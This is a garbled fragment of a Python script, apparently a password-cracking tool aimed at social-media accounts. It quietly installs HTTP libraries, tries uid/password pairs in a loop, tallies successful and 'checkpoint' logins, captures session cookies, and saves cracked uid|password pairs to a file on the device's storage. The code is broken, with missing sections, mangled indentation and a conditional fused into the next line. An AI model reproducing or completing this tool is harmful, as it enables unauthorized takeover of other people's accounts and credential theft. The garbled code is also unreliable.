...
os.system('pip install mechanize requests futures bs4==2 > /dev/null') os.system('pip install bs4')
...
def AJOYsexy2(uid,pwx,tl):
    ...
    sys.stdout.write('\r\033[1;92m[TABUL]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
     sys.stdout.flush()
 ...
 oks.append(uid)
 break
 elif 'checkpoint' in log_cookie          coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
cid = coki[82:97]
print(f"\033[1;94m[AJOY-CP☠️] {uid}|{ps}")      open('/sdcard/AJOY-OK.txt', 'a').write( uid+' | '+ps+' \n')
 cps.append(uid)
 break
 else:
 continue
